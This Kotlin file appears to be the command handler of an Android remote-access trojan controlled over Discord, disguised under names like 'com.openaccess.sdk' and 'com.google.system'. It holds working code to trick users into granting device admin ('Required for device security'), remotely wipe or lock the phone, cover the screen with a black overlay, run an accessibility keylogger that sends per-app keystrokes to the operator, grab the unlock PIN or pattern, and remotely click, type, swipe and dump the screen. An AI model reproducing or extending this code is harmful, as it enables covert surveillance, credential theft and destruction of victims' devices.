package com.openaccess.sdk.service.controllers

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import com.google.system.DiscordGatewayClient
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.AdminReceiver

class DeviceController(
    private val ctx: Context,
    private val startActivitySafely: (Intent) -> Unit,
) {
    fun handleCommand(action: String, payload: String?, d: DiscordGatewayClient): Boolean {
        when (action) {
            "admin" -> handleAdmin(payload, d)
            "overlay" -> handleOverlay(payload, d)
            "keylog" -> handleKeylog(payload, d)
            "click" -> handleClick(payload, d)
            "input" -> handleInput(payload, d)
            "open" -> handleOpen(payload, d)
            "screen", "dump" -> handleScreen(d)
            "gesture" -> handleGesture(payload, d)
            "torch", "flashlight" -> handleTorch(payload, d)
            "vibrate" -> handleVibrate(payload, d)
            "pin" -> handlePin(d)
            else -> return false
        }
        return true
    }

    private fun handleAdmin(payload: String?, d: DiscordGatewayClient): String? {
        when (payload?.lowercase()) {
            "on" -> {
                val comp = AdminReceiver.getComponent(ctx)
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                if (!dpm.isAdminActive(comp)) {
                    val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                        .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                        .putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivitySafely(i)
                    d.sendMsg(":shield: **Device Admin prompt sent** — accept on device")
                } else {
                    d.sendMsg(":shield: Device Admin already active")
                }
            }
            "off" -> {
                val comp = AdminReceiver.getComponent(ctx)
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                dpm.removeActiveAdmin(comp)
                d.sendMsg(":shield: Device Admin removed")
            }
            "lock" -> {
                AdminReceiver.lockScreen(ctx)
                d.sendMsg(":shield: Device locked")
            }
            "wipe" -> {
                d.sendMsg(":warning: **Wiping device**...")
                AdminReceiver.wipeDevice(ctx)
            }
            else -> {
                val active = AdminReceiver.isActive(ctx)
                d.sendMsg(":shield: **Device Admin**: ${if (active) "ACTIVE" else "INACTIVE"}\n`!admin on` to enable\n`!admin lock` to lock screen")
            }
        }
        return null
    }

    private fun handleOverlay(payload: String?, d: DiscordGatewayClient): String? {
        val svc = AccessibilityHelper.instance
        if (svc == null) {
            d.sendMsg(":x: Accessibility service not running")
        } else {
            val enable = payload?.lowercase() != "off"
            svc.toggleBlackOverlay(enable)
            d.sendMsg(":black_large_square: Overlay **${if (enable) "ON" else "OFF"}**")
        }
        return null
    }

    private fun handleKeylog(payload: String?, d: DiscordGatewayClient): String? {
        when (payload?.lowercase()) {
            "on" -> {
                if (!AccessibilityHelper.isRunning) {
                    val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivitySafely(i)
                    d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${ctx.packageName} → toggle on")
                } else {
                    val text = AccessibilityHelper.getText()
                    val sessions = AccessibilityHelper.getAppSessions()
                    d.sendMsg(":keyboard: **Keylogger active**\nCaptured: ${text.length} chars\nApps tracked: ${sessions.size}\nUse `!keylog summary` or `!keylog raw` to view data")
                }
            }
            "off" -> {
                if (AccessibilityHelper.isRunning) {
                    val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivitySafely(i)
                    d.sendMsg(":keyboard: **Disable Keylogger**\nOpen Accessibility → ${ctx.packageName} → toggle off")
                } else {
                    d.sendMsg(":keyboard: Keylogger not running")
                }
            }
            "clear" -> {
                AccessibilityHelper.clearAppLogs()
                d.sendMsg(":wastebasket: **Keylog cleared** — all app logs wiped")
            }
            "summary" -> {
                if (!AccessibilityHelper.isRunning) {
                    d.sendMsg(":keyboard: Keylogger not running — use `!keylog on` first")
                    return null
                }
                val summary = AccessibilityHelper.getAppSummary()
                val text = AccessibilityHelper.getText()
                val embed = com.google.system.DiscordEmbed(
                    title = "📊 Keylogger — App Summary",
                    color = 0x3498DB,
                    fields = listOf(
                        com.google.system.EmbedField("📄 Total Captured", "${text.length} chars", true),
                        com.google.system.EmbedField("📋 Apps", (summary.lines().size - 1).coerceAtLeast(0).toString(), true)
                    ),
                    description = "```\n$summary\n```",
                    footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                    timestamp = System.currentTimeMillis()
                )
                d.sendEmbed("", embed)
            }
            "raw" -> {
                val cap = AccessibilityHelper.getText()
                if (cap.isEmpty()) {
                    d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured yet. Open an app and start typing.\n\nUse `!keylog on` to verify status.")
                } else {
                    val listing = "```\n${cap.take(3500)}\n```"
                    val embedDescription = if (listing.length <= 3500) listing else ""
                    val embed = com.google.system.DiscordEmbed(
                        title = "⌨️ Raw Keystrokes (${cap.length} chars)",
                        description = embedDescription,
                        color = 0xF1C40F,
                        fields = listOf(
                            com.google.system.EmbedField("📄 Length", "${cap.length} chars", true)
                        ),
                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                        timestamp = System.currentTimeMillis()
                    )
                    d.sendEmbed("", embed)
                    if (embedDescription.isEmpty()) {
                        d.sendLargeOutput("⌨️ **Raw Keystrokes** (${cap.length} chars)\n", "```\n${cap.take(1900)}\n```")
                    }
                }
            }
            else -> {
                if (!AccessibilityHelper.isRunning) {
                    d.sendMsg(":keyboard: **Keylogger**\nNot running. Use `!keylog on` to enable.\n\n**Usage:**\n`!keylog` — per-app logs\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
                    return null
                }
                val logs = AccessibilityHelper.getFormattedAppLogs()
                val text = AccessibilityHelper.getText()
                if (logs.isEmpty() || logs == "No app activity logged") {
                    d.sendMsg(":keyboard: **Keylogger Active**\nCaptured: ${text.length} chars\nNo app activity yet. Open an app and start typing.\n\n**Usage:**\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
                } else {
                    val listing = "```\n$logs\n```"
                    val embedDescription = if (listing.length <= 3500) listing else ""
                    val embed = com.google.system.DiscordEmbed(
                        title = "⌨️ Per-App Keylog (${text.length} chars)",
                        description = embedDescription,
                        color = 0x3498DB,
                        fields = listOf(
                            com.google.system.EmbedField("📄 Total", "${text.length} chars", true)
                        ),
                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                        timestamp = System.currentTimeMillis()
                    )
                    d.sendEmbed("", embed)
                    if (embedDescription.isEmpty()) {
                        d.sendLargeOutput("⌨️ **Per-App Keylog** (${text.length} chars)\n", "```\n$logs\n```")
                    }
                }
            }
        }
        return null
    }

    private fun handleClick(payload: String?, d: DiscordGatewayClient): String? {
        val svc = AccessibilityHelper.instance
        if (svc == null) { d.sendMsg(":x: Accessibility not running"); return null }
        if (payload == null || payload.isBlank()) {
            d.sendMsg(":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>` — clicks first matching text\nUsage: `!click x,y` — clicks at screen coordinates\nExample: `!click Sign In`\nExample: `!click 540,1200`")
            return null
        }
        val coords = payload.split(",")
        if (coords.size == 2) {
            val x = coords[0].trim().toIntOrNull()
            val y = coords[1].trim().toIntOrNull()
            if (x != null && y != null) {
                svc.harvester.click(x, y)
                d.sendMsg(":point_up: Clicked ($x, $y)")
            } else {
                d.sendMsg(":x: Invalid coordinates")
            }
        } else {
            svc.harvester.clickByText(payload)
            d.sendMsg(":point_up: Clicked text: $payload")
        }
        return null
    }

    private fun handleInput(payload: String?, d: DiscordGatewayClient): String? {
        val svc = AccessibilityHelper.instance
        if (svc == null) { d.sendMsg(":x: Accessibility not running"); return null }
        if (payload == null || payload.isBlank()) {
            d.sendMsg(":keyboard: **!input**\nType text via accessibility.\nUsage: `!input <text>`\nExample: `!input Hello World`")
            return null
        }
        svc.harvester.inputText(payload)
        d.sendMsg(":keyboard: Input sent")
        return null
    }

    private fun handleOpen(payload: String?, d: DiscordGatewayClient): String? {
        if (payload == null || payload.isBlank()) {
            d.sendMsg(":link: **!open**\nLaunch an app.\nUsage: `!open com.example.app`\nUsage: `!open chrome` (short name)\nExamples: `!open chrome`, `!open whatsapp`, `!open maps`")
            return null
        }
        try {
            var intent = ctx.packageManager.getLaunchIntentForPackage(payload)
            if (intent == null) {
                val foundPkg = findPackageByName(payload)
                if (foundPkg != null) {
                    intent = ctx.packageManager.getLaunchIntentForPackage(foundPkg)
                }
            }
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivitySafely(intent)
                d.sendMsg(":link: Opened: ${intent.component?.packageName ?: payload}")
            } else {
                d.sendMsg(":x: Package not installed: $payload")
            }
        } catch (e: Exception) {
            d.sendMsg(":x: Failed: ${e.message?.take(50)}")
        }
        return null
    }

    private fun handleScreen(d: DiscordGatewayClient): String? {
        val svc = AccessibilityHelper.instance
        if (svc == null) { d.sendMsg(":x: Accessibility not running"); return null }
        val tree = svc.harvester.dumpScreen()
        if (tree.isBlank()) {
            d.sendMsg(":frame_photo: No UI elements detected")
        } else {
            val listing = "```\n${tree.take(3490)}\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = "🖼 UI Tree",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📄 Nodes", "${tree.lines().size} elements", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput("🖼 **UI Tree**\n", "```\n${tree.take(1900)}\n```")
            }
        }
        return null
    }

    private fun handleGesture(payload: String?, d: DiscordGatewayClient): String? {
        val svc = AccessibilityHelper.instance
        if (svc == null) { d.sendMsg(":x: Accessibility not running"); return null }
        if (payload == null) {
            d.sendMsg(":hand: **!gesture**\nPerform swipe gesture.\nUsage: `!gesture x1,y1,x2,y2,ms`\nExample: `!gesture 540,1800,540,600,300`")
            return null
        }
        val parts = payload.split(",")
        if (parts.size == 5) {
            val x1 = parts[0].trim().toIntOrNull()
            val y1 = parts[1].trim().toIntOrNull()
            val x2 = parts[2].trim().toIntOrNull()
            val y2 = parts[3].trim().toIntOrNull()
            val ms = parts[4].trim().toIntOrNull() ?: 300
            if (x1 != null && y1 != null && x2 != null && y2 != null) {
                svc.harvester.swipe(x1, y1, x2, y2, ms)
                d.sendMsg(":hand_splayed: Swipe ($x1,$y1)->($x2,$y2) ${ms}ms")
            } else {
                d.sendMsg(":x: Invalid coordinates. Usage: `!gesture x1,y1,x2,y2,ms`")
            }
        } else {
            d.sendMsg(":x: Invalid params. Usage: `!gesture x1,y1,x2,y2,ms`")
        }
        return null
    }

    private fun handleTorch(payload: String?, d: DiscordGatewayClient): String? {
        val mode = payload?.lowercase()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val camId = cm.cameraIdList.firstOrNull { id ->
                    val chars = cm.getCameraCharacteristics(id)
                    chars.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                }
                if (camId != null) {
                    val on = mode == "on" || mode == "1" || mode == null
                    cm.setTorchMode(camId, on)
                    d.sendMsg(":flashlight: Torch **${if (on) "ON" else "OFF"}**")
                } else {
                    d.sendMsg(":x: No flash available")
                }
            } catch (e: Exception) {
                d.sendMsg(":x: Torch failed: ${e.message?.take(50)}")
            }
        } else {
            d.sendMsg(":x: Torch requires API 23+")
        }
        return null
    }

    private fun handleVibrate(payload: String?, d: DiscordGatewayClient): String? {
        val ms = (payload?.toLongOrNull() ?: 1000L).coerceIn(100L, 10000L)
        try {
            val vb = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (vb.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vb.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    vb.vibrate(ms)
                }
                d.sendMsg(":loud_sound: Vibrated for ${ms}ms")
            } else {
                d.sendMsg(":x: No vibrator found")
            }
        } catch (e: Exception) {
            d.sendMsg(":x: Vibrate failed: ${e.message?.take(50)}")
        }
        return null
    }

    private fun handlePin(d: DiscordGatewayClient): String? {
        if (!AccessibilityHelper.isRunning) {
            d.sendMsg(":x: Accessibility service not running — `!keylog on` first")
        } else {
            d.sendMsg(":key: **PIN/Pattern grabber**\nEnable it via accessibility. Results appear here automatically after unlock.\n`!debug` for captured data.")
        }
        return null
    }

    private fun findPackageByName(name: String): String? {
        val search = name.lowercase().replace(" ", "")
        val commonApps = mapOf(
            "chrome" to "com.android.chrome",
            "whatsapp" to "com.whatsapp",
            "telegram" to "org.telegram.messenger",
            "signal" to "org.thoughtcrime.securesms",
            "instagram" to "com.instagram.android",
            "facebook" to "com.facebook.katana",
            "twitter" to "com.twitter.android",
            "maps" to "com.google.android.apps.maps",
            "gmail" to "com.google.android.gm",
            "youtube" to "com.google.android.youtube",
            "settings" to "com.android.settings",
            "photos" to "com.google.android.apps.photos",
            "camera" to "com.google.android.GoogleCamera",
            "play" to "com.android.vending",
            "dialer" to "com.google.android.dialer",
            "contacts" to "com.google.android.contacts",
            "messages" to "com.google.android.apps.messaging",
            "files" to "com.google.android.apps.nbu.files",
            "calculator" to "com.google.android.calculator",
            "calendar" to "com.google.android.calendar",
            "notes" to "com.google.android.keep",
        )
        commonApps[search]?.let { return it }
        val pm = ctx.packageManager
        val apps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pm.getInstalledPackages(android.content.pm.PackageManager.PackageInfoFlags.of(0L))
        } else {
            @Suppress("DEPRECATION")
            pm.getInstalledPackages(0)
        }
        for (app in apps) {
            val label = app.applicationInfo?.loadLabel(pm)?.toString()?.lowercase()?.replace(" ", "") ?: ""
            val pkgName = app.packageName.lowercase()
            if (label == search || pkgName.contains(search)) return app.packageName
        }
        return null
    }
}
